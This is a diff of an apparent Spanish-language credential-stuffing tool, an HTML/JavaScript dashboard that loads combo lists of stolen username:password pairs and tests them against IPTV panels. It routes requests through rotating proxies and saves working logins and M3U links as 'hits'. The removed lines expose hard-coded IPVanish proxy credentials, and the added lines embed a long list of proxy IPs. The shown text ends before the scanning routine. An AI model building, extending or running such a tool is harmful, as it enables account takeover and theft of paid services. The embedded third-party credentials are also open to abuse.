@@ -3,24 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>☢️ ALEXTEAMVENENO · DRAGÓN APK</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * http://* https://*;">
+    <title>☢️ ALEXTEAMVENENO · HTTP PROXY</title>
     <style>
         :root {
-            --neon-magenta: #ff00ff;
-            --neon-cyan: #00ffff;
-            --neon-green: #00ff41;
-            --neon-yellow: #ffe600;
-            --neon-orange: #ff6a00;
-            --neon-red: #ff0040;
-            --neon-purple: #b300ff;
-            --dragon-fire: #ff4500;
-            --bg-deep: #050508;
-            --text-dim: #7a7a9a;
-            --text-body: #c0c0e0;
+            --neon-magenta: #ff00ff; --neon-cyan: #00ffff; --neon-green: #00ff41;
+            --neon-yellow: #ffe600; --neon-orange: #ff6a00; --neon-red: #ff0040;
+            --neon-purple: #b300ff; --bg-deep: #050508; --text-dim: #7a7a9a; --text-body: #c0c0e0;
         }
-
-        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent; }
-
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body {
             background: var(--bg-deep);
             background-image: linear-gradient(rgba(255,0,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,255,0.02) 1px, transparent 1px);
@@ -29,286 +20,49 @@
             font-family: 'Courier New', 'Consolas', monospace;
             min-height: 100vh;
         }
-
         body::before { content: ''; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); pointer-events: none; z-index:0; }
-
         .content-wrapper { position: relative; z-index: 1; display: none; padding: 12px 10px 80px 10px; }
-
-        /* LOGIN */
-        #loginScreen {
-            position: fixed;
-            top:0; left:0;
-            width:100%; height:100%;
-            z-index: 100;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.96);
-            backdrop-filter: blur(10px);
-            padding: 20px;
-        }
-
-        .login-box {
-            background: rgba(10,5,20,0.97);
-            border: 2px solid var(--neon-magenta);
-            border-radius: 28px;
-            padding: 30px 22px;
-            width: 100%;
-            max-width: 360px;
-            box-shadow: 0 0 35px rgba(255,0,255,0.4);
-        }
-
-        .login-logo { text-align: center; font-size: 3.5em; margin-bottom: 8px; animation: pulse 1.5s ease infinite; }
-        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-
-        .login-brand { text-align: center; font-size: 1.2em; font-weight: 900; letter-spacing: 3px; background: linear-gradient(90deg, #ff00ff, #00ffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-
-        .input-group { margin-bottom: 18px; }
-        .input-group label { font-size: 0.7em; color: #00ffff; letter-spacing: 2px; display: block; margin-bottom: 6px; }
-        .input-group input {
-            width: 100%;
-            background: #0a0a18;
-            border: 1px solid rgba(0,255,255,0.3);
-            border-radius: 14px;
-            padding: 12px 14px;
-            color: white;
-            font-family: monospace;
-            font-size: 0.9em;
-        }
-        .input-group input:focus { border-color: #ff00ff; outline: none; }
-
-        .btn-login {
-            width: 100%;
-            background: linear-gradient(135deg, #b80040, #ff0040);
-            border: none;
-            border-radius: 40px;
-            padding: 14px;
-            color: white;
-            font-weight: bold;
-            letter-spacing: 2px;
-            font-size: 1em;
-            margin-top: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 15px #ff0040;
-        }
-
-        .login-error { text-align: center; color: #ff0040; font-size: 0.7em; margin-top: 12px; display: none; }
-
-        /* DASHBOARD */
-        .banner {
-            background: linear-gradient(135deg, #0a0514, #150523);
-            border: 1px solid #ff00ff;
-            border-radius: 20px;
-            padding: 12px;
-            text-align: center;
-            font-weight: bold;
-            margin-bottom: 12px;
-        }
-
-        .main-container { display: flex; flex-direction: column; gap: 12px; }
-
-        .card {
-            background: rgba(13,13,26,0.9);
-            border: 1px solid rgba(0,255,255,0.2);
-            border-radius: 18px;
-            padding: 14px;
-        }
-
-        .card-title {
-            font-size: 0.75em;
-            font-weight: bold;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-            color: #ff00ff;
-            border-left: 3px solid #ff00ff;
-            padding-left: 10px;
-        }
-
-        .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-        .col { flex: 1; min-width: 0; }
-
-        input, select, button {
-            background: #0f0f1e;
-            border: 1px solid #ff00ff40;
-            border-radius: 14px;
-            padding: 10px 12px;
-            color: #00ffff;
-            font-family: monospace;
-            font-size: 0.8em;
-        }
-
-        button {
-            background: linear-gradient(135deg, #1a0a2a, #0f0f1e);
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.2s;
-        }
-        button:active { transform: scale(0.96); }
-
-        .btn-start {
-            background: linear-gradient(135deg, #b80040, #ff0040);
-            color: white;
-            border: none;
-            flex: 2;
-            font-size: 1em;
-            padding: 14px;
-        }
-        .btn-stop { background: #5a0050; flex: 1; }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-            margin-bottom: 10px;
-        }
-        .stat-box {
-            background: #0a0a18;
-            border-radius: 14px;
-            padding: 8px 4px;
-            text-align: center;
-            font-size: 0.6em;
-        }
-        .stat-value { font-size: 1.4em; font-weight: bold; display: block; }
-        .stat-hits .stat-value { color: #00ff41; text-shadow: 0 0 6px #00ff41; }
-
-        .progress-bar {
-            height: 12px;
-            background: #1a1a2a;
-            border-radius: 20px;
-            overflow: hidden;
-            margin: 8px 0;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #b300ff, #ff00ff, #ff6a00);
-            width: 0%;
-            transition: width 0.2s;
-        }
-
-        .console {
-            background: #05050f;
-            border-radius: 14px;
-            padding: 10px;
-            font-size: 0.65em;
-            height: 120px;
-            overflow-y: auto;
-            color: #00ff41;
-            font-family: monospace;
-        }
-
-        .table-container {
-            overflow-x: auto;
-            border-radius: 16px;
-            background: #0a0a18;
-            margin-top: 8px;
-        }
-        .hits-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.7em;
-            min-width: 700px;
-        }
-        .hits-table th {
-            background: #150a25;
-            color: #ff00ff;
-            padding: 8px 5px;
-            position: sticky;
-            top: 0;
-        }
-        .hits-table td {
-            padding: 8px 5px;
-            border-bottom: 1px solid #ff00ff20;
-        }
-        .hits-table tr:active { background: #ff00ff20; }
-
-        .m3u-cell { display: flex; gap: 6px; align-items: center; }
-        .m3u-link-text {
-            max-width: 120px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            color: #00ffff;
-            text-decoration: underline;
-        }
-        .btn-copy-m3u { padding: 4px 8px; font-size: 0.7em; }
-
-        .modal-overlay {
-            position: fixed;
-            top:0; left:0;
-            width:100%; height:100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 15px;
-        }
-        .modal {
-            background: #0f0f1f;
-            border: 2px solid #ff00ff;
-            border-radius: 28px;
-            max-width: 500px;
-            width: 100%;
-            max-height: 85vh;
-            overflow-y: auto;
-            padding: 20px;
-        }
-        .m3u-link-full {
-            background: #050510;
-            border-radius: 16px;
-            padding: 12px;
-            word-break: break-all;
-            color: #00ffff;
-            margin: 12px 0;
-        }
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            background: #1a0a2a;
-            border: 1px solid #ff00ff;
-            border-radius: 40px;
-            padding: 12px;
-            text-align: center;
-            z-index: 1100;
-            display: none;
-            font-size: 0.8em;
-            backdrop-filter: blur(10px);
-        }
-        .footer-actions {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #050510dd;
-            backdrop-filter: blur(10px);
-            display: flex;
-            gap: 8px;
-            padding: 8px 12px;
-            z-index: 50;
-            border-top: 1px solid #ff00ff;
-        }
-        .footer-actions button { flex: 1; font-size: 0.7em; border-radius: 40px; }
-        .lang-indicator {
-            position: fixed;
-            top: 12px;
-            right: 12px;
-            background: #000000aa;
-            border-radius: 40px;
-            padding: 5px 12px;
-            font-size: 1.2em;
-            z-index: 60;
-            backdrop-filter: blur(4px);
-        }
-        @media (max-width: 500px) {
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-            .card-title { font-size: 0.7em; }
-        }
+        #loginScreen { position: fixed; top:0; left:0; width:100%; height:100%; z-index:100; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.96); padding:20px; }
+        .login-box { background:rgba(10,5,20,0.97); border:2px solid var(--neon-magenta); border-radius:28px; padding:30px 22px; width:100%; max-width:360px; box-shadow:0 0 35px rgba(255,0,255,0.4); }
+        .login-logo { text-align:center; font-size:3.5em; margin-bottom:8px; animation:pulse 1.5s ease infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+        .login-brand { text-align:center; font-size:1.2em; font-weight:900; letter-spacing:3px; background:linear-gradient(90deg, #ff00ff, #00ffff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .login-error { text-align:center; color:#ff0040; font-size:0.7em; margin-top:12px; display:none; }
+        .input-group { margin-bottom:18px; }
+        .input-group label { font-size:0.7em; color:#00ffff; letter-spacing:2px; display:block; margin-bottom:6px; }
+        .input-group input { width:100%; background:#0a0a18; border:1px solid rgba(0,255,255,0.3); border-radius:14px; padding:12px 14px; color:white; font-family:monospace; font-size:0.9em; }
+        .input-group input:focus { border-color:#ff00ff; outline:none; }
+        .btn-login { width:100%; background:linear-gradient(135deg, #b80040, #ff0040); border:none; border-radius:40px; padding:14px; color:white; font-weight:bold; letter-spacing:2px; font-size:1em; margin-top:10px; cursor:pointer; box-shadow:0 0 15px #ff0040; }
+        .banner { background:linear-gradient(135deg, #0a0514, #150523); border:1px solid #ff00ff; border-radius:20px; padding:12px; text-align:center; font-weight:bold; margin-bottom:12px; }
+        .card { background:rgba(13,13,26,0.9); border:1px solid rgba(0,255,255,0.2); border-radius:18px; padding:14px; margin-bottom:10px; }
+        .card-title { font-size:0.75em; font-weight:bold; letter-spacing:2px; margin-bottom:10px; color:#ff00ff; border-left:3px solid #ff00ff; padding-left:10px; }
+        .row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
+        input, select, button { background:#0f0f1e; border:1px solid #ff00ff40; border-radius:14px; padding:10px 12px; color:#00ffff; font-family:monospace; font-size:0.8em; }
+        button { cursor:pointer; font-weight:bold; transition:0.2s; }
+        button:active { transform:scale(0.96); }
+        .btn-start { background:linear-gradient(135deg, #b80040, #ff0040); color:white; border:none; flex:2; font-size:1em; padding:14px; }
+        .btn-stop { background:#5a0050; flex:1; }
+        .stats-grid { display:grid; grid-template-columns:repeat(4, 1fr); gap:8px; margin-bottom:10px; }
+        .stat-box { background:#0a0a18; border-radius:14px; padding:8px 4px; text-align:center; font-size:0.6em; }
+        .stat-value { font-size:1.4em; font-weight:bold; display:block; color:var(--neon-cyan); }
+        .stat-hits .stat-value { color:#00ff41; text-shadow:0 0 6px #00ff41; }
+        .progress-bar { height:12px; background:#1a1a2a; border-radius:20px; overflow:hidden; margin:8px 0; }
+        .progress-fill { height:100%; background:linear-gradient(90deg, #b300ff, #ff00ff, #ff6a00); width:0%; transition:width 0.2s; }
+        .console { background:#05050f; border-radius:14px; padding:10px; font-size:0.65em; height:120px; overflow-y:auto; color:#00ff41; font-family:monospace; }
+        .table-container { overflow-x:auto; border-radius:16px; background:#0a0a18; margin-top:8px; }
+        .hits-table { width:100%; border-collapse:collapse; font-size:0.7em; min-width:700px; }
+        .hits-table th { background:#150a25; color:#ff00ff; padding:8px 5px; position:sticky; top:0; }
+        .hits-table td { padding:8px 5px; border-bottom:1px solid #ff00ff20; }
+        .hits-table tr:active { background:#ff00ff20; }
+        .toast { position:fixed; bottom:20px; left:20px; right:20px; background:#1a0a2a; border:1px solid #ff00ff; border-radius:40px; padding:12px; text-align:center; z-index:1100; display:none; font-size:0.8em; }
+        .footer-actions { position:fixed; bottom:0; left:0; right:0; background:#050510dd; backdrop-filter:blur(10px); display:flex; gap:8px; padding:8px 12px; z-index:50; border-top:1px solid #ff00ff; }
+        .footer-actions button { flex:1; font-size:0.7em; border-radius:40px; }
+        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; display:none; align-items:center; justify-content:center; padding:15px; }
+        .modal { background:#0f0f1f; border:2px solid #ff00ff; border-radius:28px; max-width:500px; width:100%; padding:20px; }
+        .m3u-link-full { background:#050510; border-radius:16px; padding:12px; word-break:break-all; color:#00ffff; margin:12px 0; }
     </style>
 </head>
 <body>
-
 <div id="loginScreen">
     <div class="login-box">
         <div class="login-logo">🐉☢️</div>
@@ -319,258 +73,264 @@
         <div class="login-error" id="loginError">⚠️ Credenciales incorrectas</div>
     </div>
 </div>
-
 <div class="content-wrapper" id="dashboard">
-    <div class="banner">☢️ TEAM VENENO · ALEX92 · IPVANISH PROXY ☢️</div>
-    <div class="main-container">
-        <div class="card">
-            <div class="card-title">📁 COMBO LOADER</div>
-            <div class="row">
-                <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
-                <button onclick="document.getElementById('comboFile').click()" style="flex:2">📂 CARGAR COMBO</button>
-                <span id="comboStatus" style="font-size:0.7em;">0 cuentas</span>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🌐 PROXY IPVANISH (PRIVADO)</div>
-            <select id="proxyServer" style="width:100%; margin-bottom:8px;">
-                <option value="waw">🇵🇱 Warsaw (Varsovia)</option>
-                <option value="chi">🇺🇸 Chicago</option>
-                <option value="sjc">🇺🇸 San José</option>
-                <option value="phx">🇺🇸 Phoenix</option>
-                <option value="atl">🇺🇸 Atlanta</option>
-                <option value="mel">🇦🇺 Melbourne</option>
-                <option value="nyc" selected>🇺🇸 New York</option>
-                <option value="ams">🇳🇱 Amsterdam</option>
-                <option value="lax">🇺🇸 Los Ángeles</option>
-                <option value="iad">🇺🇸 Washington DC</option>
-                <option value="tor">🇨🇦 Toronto</option>
-                <option value="dal">🇺🇸 Dallas</option>
-                <option value="lon">🇬🇧 London</option>
-                <option value="cvg">🇺🇸 Cincinnati</option>
-                <option value="mia">🇺🇸 Miami</option>
-                <option value="sin">🇸🇬 Singapore</option>
-            </select>
-            <span id="proxyStatus" style="font-size:0.7em;">🔒 Proxy IPVanish activo</span>
-        </div>
-
-        <div class="card">
-            <div class="card-title">⚙️ CONFIGURACIÓN</div>
-            <input type="text" id="portals" placeholder="tudominio.com:80, otropanel.com" style="width:100%; margin-bottom:8px;">
-            <div class="row">
-                <div class="col"><label>🔢 HILOS</label><input type="number" id="threads" value="20" min="1" max="80"></div>
-                <label style="display:flex; align-items:center; gap:6px;"><input type="checkbox" id="useHttps"> 🔒 SSL</label>
-                <label style="display:flex; align-items:center; gap:6px;"><input type="checkbox" id="useProxies" checked> 🌐 PROXY</label>
-            </div>
-        </div>
-
-        <div class="stats-grid">
-            <div class="stat-box">🔍 SCANNED<span class="stat-value" id="statChecked">0</span></div>
-            <div class="stat-box stat-hits">✅ HITS<span class="stat-value" id="statHits">0</span></div>
-            <div class="stat-box">❌ ERR<span class="stat-value" id="statErrors">0</span></div>
-            <div class="stat-box">🎯 RATE<span class="stat-value" id="statRate">0%</span></div>
-            <div class="stat-box">📺 CANALES<span class="stat-value" id="statChannels">0</span></div>
-            <div class="stat-box">🇪🇸 ESPAÑA<span class="stat-value" id="statSpain">0</span></div>
-            <div class="stat-box">⏳ ETA<span class="stat-value" id="statETA">00:00</span></div>
-            <div class="stat-box">📈 CPM<span class="stat-value" id="statCPM">0</span></div>
-        </div>
-        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-
-        <div class="card" style="padding:8px;">
-            <div class="card-title">📟 CONSOLA</div>
-            <div class="console" id="console">> ALEXTEAMVENENO APK v3.0 (IPVANISH)<br>> Inicia sesión para comenzar</div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">⭐ HIT DATABASE (AUTO-SAVE)</div>
-            <div class="table-container">
-                <table class="hits-table" id="hitsTable">
-                    <thead><tr><th>USER</th><th>PASS</th><th>PANEL</th><th>📺</th><th>🇪🇸</th><th>M3U</th></tr></thead>
-                    <tbody id="hitsBody"></tbody>
-                </table>
-            </div>
-        </div>
-
-        <div class="row" style="margin-top:6px; gap:12px;">
-            <button class="btn-start" id="btnStart" onclick="startScan()">🚀 INICIAR ATAQUE</button>
-            <button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ DETENER</button>
+    <div class="banner">☢️ TEAM VENENO · HTTP PROXY · 300+ PROXIES ☢️</div>
+    <div class="card">
+        <div class="card-title">📁 COMBO LOADER</div>
+        <div class="row">
+            <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
+            <button onclick="document.getElementById('comboFile').click()" style="flex:2">📂 CARGAR COMBO</button>
+            <span id="comboStatus" style="font-size:0.7em;">0 cuentas</span>
         </div>
     </div>
+    <div class="card">
+        <div class="card-title">🌐 HTTP PROXIES ({{PROXY_COUNT}} activos)</div>
+        <div class="row">
+            <button onclick="scrapeProxies()" id="btnScrape" style="flex:1">🔄 RECARGAR PROXY</button>
+            <label style="display:flex;align-items:center;gap:6px;font-size:0.7em;color:var(--neon-cyan);">
+                <input type="checkbox" id="useProxies" checked> USAR PROXY
+            </label>
+        </div>
+        <span id="proxyStatus" style="font-size:0.7em;">✅ Proxy listo</span>
+    </div>
+    <div class="card">
+        <div class="card-title">⚙️ CONFIGURACIÓN</div>
+        <input type="text" id="portals" placeholder="panel.com:80" style="width:100%; margin-bottom:8px;">
+        <div class="row">
+            <div class="col"><label>🔢 HILOS</label><input type="number" id="threads" value="20" min="1" max="80"></div>
+            <label style="display:flex;align-items:center;gap:6px;"><input type="checkbox" id="useHttps"> 🔒 SSL</label>
+        </div>
+    </div>
+    <div class="stats-grid">
+        <div class="stat-box">🔍 SCANNED<span class="stat-value" id="statChecked">0</span></div>
+        <div class="stat-box stat-hits">✅ HITS<span class="stat-value" id="statHits">0</span></div>
+        <div class="stat-box">❌ ERR<span class="stat-value" id="statErrors">0</span></div>
+        <div class="stat-box">📈 CPM<span class="stat-value" id="statCPM">0</span></div>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="card" style="padding:8px;">
+        <div class="card-title">📟 CONSOLA</div>
+        <div class="console" id="console">> ALEXTEAMVENENO v4.0 · HTTP PROXY<br>> Listo para atacar</div>
+    </div>
+    <div class="card">
+        <div class="card-title">⭐ HIT DATABASE</div>
+        <div class="table-container">
+            <table class="hits-table" id="hitsTable">
+                <thead><tr><th>USER</th><th>PASS</th><th>PANEL</th><th>📺</th><th>🇪🇸</th><th>M3U</th></tr></thead>
+                <tbody id="hitsBody"></tbody>
+            </table>
+        </div>
+    </div>
+    <div class="row" style="margin-top:6px; gap:12px;">
+        <button class="btn-start" id="btnStart" onclick="startScan()">🚀 INICIAR ATAQUE</button>
+        <button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ DETENER</button>
+    </div>
 </div>
-
 <div class="footer-actions">
-    <button onclick="saveHitsToTxt()">💾 GUARDAR HITS</button>
+    <button onclick="saveHitsToTxt()">💾 GUARDAR</button>
     <button onclick="clearHits()">🗑️ LIMPIAR</button>
     <button onclick="doLogout()">🚪 SALIR</button>
 </div>
-<div class="lang-indicator" id="langIndicator" onclick="toggleLang()">🇪🇸</div>
-
 <div class="modal-overlay" id="m3uModal" onclick="closeModal(event)">
     <div class="modal" onclick="event.stopPropagation()">
-        <div style="font-size:1.2em; margin-bottom:12px;">☢️ DETALLES DEL HIT</div>
-        <div id="modalHitInfo" style="background:#050510; border-radius:16px; padding:12px; margin-bottom:12px;"></div>
+        <div style="font-size:1.2em;margin-bottom:12px;">☢️ DETALLES</div>
+        <div id="modalHitInfo" style="background:#050510;border-radius:16px;padding:12px;margin-bottom:12px;"></div>
         <div class="m3u-link-full" id="m3uModalLink" onclick="copyM3uFromModal()"></div>
-        <div class="row" style="margin-top:12px;">
-            <button onclick="copyM3uFromModal()" style="flex:1">📋 COPIAR M3U</button>
-            <button onclick="copyAllDetails()" style="flex:1">📄 COPIAR TODO</button>
-            <button onclick="closeModal()">❌ CERRAR</button>
-        </div>
+        <div class="row"><button onclick="copyM3uFromModal()" style="flex:1">📋 COPIAR M3U</button><button onclick="closeModal()">❌ CERRAR</button></div>
     </div>
 </div>
 <div class="toast" id="toast"></div>
 
 <script>
-    // 🔥 PROXIES PRIVADOS IPVANISH
-    const IPVANISH_USER = 'HaVsv6EWVhIs';
-    const IPVANISH_PASS = 'oqWTfhYgm8vQ';
-    const IPVANISH_SERVERS = {
-        waw: 'waw.socks.ipvanish.com',
-        chi: 'chi.socks.ipvanish.com',
-        sjc: 'sjc.socks.ipvanish.com',
-        phx: 'phx.socks.ipvanish.com',
-        atl: 'atl.socks.ipvanish.com',
-        mel: 'mel.socks.ipvanish.com',
-        nyc: 'nyc.socks.ipvanish.com',
-        ams: 'ams.socks.ipvanish.com',
-        lax: 'lax.socks.ipvanish.com',
-        iad: 'iad.socks.ipvanish.com',
-        tor: 'tor.socks.ipvanish.com',
-        dal: 'dal.socks.ipvanish.com',
-        lon: 'lon.socks.ipvanish.com',
-        cvg: 'cvg.socks.ipvanish.com',
-        mia: 'mia.socks.ipvanish.com',
-        sin: 'sin.socks.ipvanish.com'
-    };
+    // 🔥 TUS PROXIES HTTP (pre-cargados para velocidad)
+    const PRIVATE_PROXIES = [
+        "52.229.30.3:80","185.135.69.34:80","154.16.146.46:80","47.251.73.54:9098","47.91.121.127:9999",
+        "8.213.134.213:20","106.14.91.83:3128","47.237.113.119:8181","8.215.12.103:90","47.109.110.100:80",
+        "58.216.109.13:800","47.254.36.213:8000","83.168.74.163:8080","8.219.229.53:8008","115.124.76.241:8080",
+        "8.221.138.111:80","47.250.159.65:8181","66.181.33.12:80","47.121.129.129:9080","187.0.163.71:80",
+        "172.200.72.48:80","47.238.130.212:59394","121.43.109.88:80","139.59.57.230:80","47.238.128.246:8181",
+        "68.178.161.107:80","47.91.115.179:8081","47.250.159.65:3128","197.221.240.246:80","203.110.240.156:80",
+        "101.255.166.134:80","12.50.107.217:80","47.90.149.238:3128","39.102.213.187:1081","47.91.115.179:9098",
+        "47.238.128.246:1000","8.210.17.35:8888","39.102.208.149:9080","47.112.11.170:3128","47.116.126.57:10000",
+        "47.89.159.212:31281","8.210.17.35:8003","47.254.36.213:8060","8.215.15.163:5060","8.215.12.103:8006",
+        "120.26.0.11:8880","149.129.255.179:8081","47.254.36.213:32764","78.80.228.150:80","8.221.139.222:8080",
+        "47.251.87.199:312","43.225.52.155:80","101.132.249.207:6588","47.90.149.238:8081","8.221.141.88:9507",
+        "47.252.18.37:10002","8.221.139.222:8443","103.148.51.221:8090","8.211.200.183:8443","8.220.141.8:9098",
+        "8.211.194.78:8081","58.241.88.13:800","8.219.229.53:3128","47.251.87.74:1036","47.74.46.81:8080",
+        "8.219.229.53:59394","121.43.109.88:8008","8.211.51.115:5060","8.221.138.111:9080","139.224.186.221:8088",
+        "47.91.29.151:8080","8.137.13.191:8080","47.89.159.212:3129","47.252.11.233:8080","47.238.128.246:8081",
+        "8.212.151.166:18081","47.76.144.139:8443","47.251.87.199:2083","39.102.209.121:8080","47.100.130.127:3129",
+        "8.213.197.208:3128","8.212.165.164:1111","221.153.92.39:80","8.221.139.222:8028","47.76.144.139:9443",
+        "83.143.30.97:7080","8.213.134.213:8081","8.137.13.191:9098","39.104.59.56:80","149.129.255.179:18080",
+        "138.117.85.217:999","39.102.211.162:10000","47.238.130.212:9080","47.250.11.111:41","47.250.51.110:8888",
+        "8.213.222.157:10000","39.102.208.149:9999","185.162.60.45:8080","8.220.204.92:9091","115.239.234.43:7302",
+        "47.91.110.148:13","54.236.37.53:80","8.220.204.92:1088","47.251.73.54:5060","47.237.92.86:80",
+        "47.91.110.148:1000","8.213.215.187:10000","182.16.8.43:80","47.91.121.127:80","68.183.143.134:80",
+        "47.92.152.43:8888","47.74.46.81:10000","39.102.211.162:3128","203.95.199.159:8080","47.92.143.92:80",
+        "154.16.146.45:80","139.196.175.68:80","8.138.149.37:80","39.102.210.222:9098","176.126.164.213:80",
+        "8.213.222.247:8443","47.250.11.111:9098","8.130.74.114:9080","8.215.3.250:80","47.238.130.212:8080",
+        "47.238.134.126:8443","149.129.226.9:8443","8.212.165.164:5000","39.102.209.128:10000","47.250.177.202:20000",
+        "39.102.208.189:8443","79.110.202.131:8081","8.134.149.133:3128","47.121.182.36:8888","8.212.168.170:1000"
+    ];
+    
+    let proxies = [...PRIVATE_PROXIES];
+    let proxyIndex = 0;
+    document.getElementById('proxyStatus').textContent = `✅ ${proxies.length} proxies listos`;
 
-    function getProxyUrl() {
-        const serverKey = document.getElementById('proxyServer').value;
-        const server = IPVANISH_SERVERS[serverKey];
-        return `socks5h://${IPVANISH_USER}:${IPVANISH_PASS}@${server}:1080`;
-    }
-
-    // ========== CREDENCIALES FIJAS ==========
     const VALID_USER = 'ALEX';
     const VALID_PASS = 'IPTV92';
     let isLoggedIn = false;
-    let currentLang = 'es';
-
     let comboLines = [];
-    let proxies = [];
     let hitsArray = [];
     let isRunning = false;
     let stats = { checked: 0, hits: 0, errors: 0 };
     let startTime = 0;
     let totalCombos = 0;
     let totalChannels = 0, totalSpain = 0;
+    let currentModalHit = null;
 
-    function saveHitsToLocalStorage() {
+    function getNextProxy() {
+        if (!document.getElementById('useProxies').checked || !proxies.length) return null;
+        const proxy = proxies[proxyIndex++ % proxies.length];
+        return `http://${proxy}`;
+    }
+
+    function doLogin() {
+        if (document.getElementById('loginUser').value.trim() === VALID_USER && document.getElementById('loginPass').value === VALID_PASS) {
+            isLoggedIn = true;
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            loadHits();
+            log('🔓 DRAGÓN LISTO', 'hit');
+            showToast('✅ Bienvenido ALEX');
+        } else {
+            document.getElementById('loginError').style.display = 'block';
+        }
+    }
+
+    function doLogout() { if(confirm('¿Salir?')){ isRunning=false; isLoggedIn=false; document.getElementById('dashboard').style.display='none'; document.getElementById('loginScreen').style.display='flex'; } }
+
+    function showToast(msg) { const t=document.getElementById('toast'); t.innerText=msg; t.style.display='block'; setTimeout(()=>t.style.display='none', 2000); }
+    
+    function log(msg, type='info') { 
+        const c=document.getElementById('console'); if(!c) return; 
+        const line=document.createElement('div'); 
+        const prefix = type==='hit'?'💥':'';
+        line.innerText=`[${new Date().toLocaleTimeString()}] ${prefix} ${msg}`; 
+        if(type==='hit') line.style.color='#00ff41';
+        c.appendChild(line); c.scrollTop=c.scrollHeight; 
+    }
+
+    function updateStats() {
+        document.getElementById('statChecked').textContent = stats.checked;
+        document.getElementById('statHits').textContent = stats.hits;
+        document.getElementById('statErrors').textContent = stats.errors;
+        if(totalCombos>0) document.getElementById('progressFill').style.width = (stats.checked/totalCombos*100)+'%';
+        if(startTime>0 && stats.checked>0){
+            const elapsed = (Date.now()-startTime)/1000;
+            document.getElementById('statCPM').textContent = Math.floor((stats.checked/elapsed)*60);
+        }
+    }
+
+    function saveHits() {
+        try { localStorage.setItem('alex_hits', JSON.stringify({hits:hitsArray,ch:totalChannels,esp:totalSpain})); } catch(e) {}
+    }
+
+    function loadHits() {
         try {
-            localStorage.setItem('alex_hits_db', JSON.stringify({
-                hits: hitsArray,
-                totalChannels: totalChannels,
-                totalSpain: totalSpain,
-                lastUpdate: Date.now()
-            }));
+            const d = JSON.parse(localStorage.getItem('alex_hits'));
+            if(d?.hits) { hitsArray = d.hits; totalChannels = d.ch||0; totalSpain = d.esp||0; renderHits(); }
         } catch(e) {}
     }
 
-    function loadHitsFromLocalStorage() {
-        try {
-            const stored = localStorage.getItem('alex_hits_db');
-            if (stored) {
-                const data = JSON.parse(stored);
-                if (data.hits && Array.isArray(data.hits)) {
-                    hitsArray = data.hits;
-                    totalChannels = data.totalChannels || 0;
-                    totalSpain = data.totalSpain || 0;
-                    renderHitsTable();
-                    updateStatsUI();
-                }
-            }
-        } catch(e) {}
-    }
-
-    function renderHitsTable() {
+    function renderHits() {
         const tbody = document.getElementById('hitsBody');
-        if (!tbody) return;
         tbody.innerHTML = '';
-        hitsArray.slice().reverse().forEach(hit => {
-            const row = tbody.insertRow();
-            row.innerHTML = `
-                <td>${escapeHtml(hit.user)}</td>
-                <td>${escapeHtml(hit.pass)}</td>
-                <td>${escapeHtml(hit.portal)}</td>
-                <td style="text-align:center;">${hit.canales||0}</td>
-                <td style="text-align:center; color:#ff6a00;">${hit.espana||0}</td>
-                <td><div class="m3u-cell"><span class="m3u-link-text">${escapeHtml(hit.m3u||'')}</span><button class="btn-copy-m3u">📋</button></div></td>
-            `;
-            row.onclick = () => showModal(hit);
-            const copyBtn = row.querySelector('.btn-copy-m3u');
-            if(copyBtn) copyBtn.onclick = (e) => { e.stopPropagation(); copyToClipboard(hit.m3u); showToast('✅ M3U copiado'); };
+        hitsArray.slice().reverse().forEach(h => {
+            const r = tbody.insertRow();
+            r.innerHTML = `<td>${h.user}</td><td>${h.pass}</td><td>${h.portal}</td><td style="text-align:center;">${h.canales||0}</td><td style="text-align:center;color:#ff6a00;">${h.espana||0}</td><td><span style="color:#00ffff;text-decoration:underline;" onclick="event.stopPropagation();copyText('${h.m3u||''}')">📋 Copiar</span></td>`;
+            r.onclick = () => showModal(h);
+            r.style.cursor = 'pointer';
         });
-        document.getElementById('statChannels').innerText = totalChannels;
-        document.getElementById('statSpain').innerText = totalSpain;
     }
 
-    function addHitToTable(hitData) {
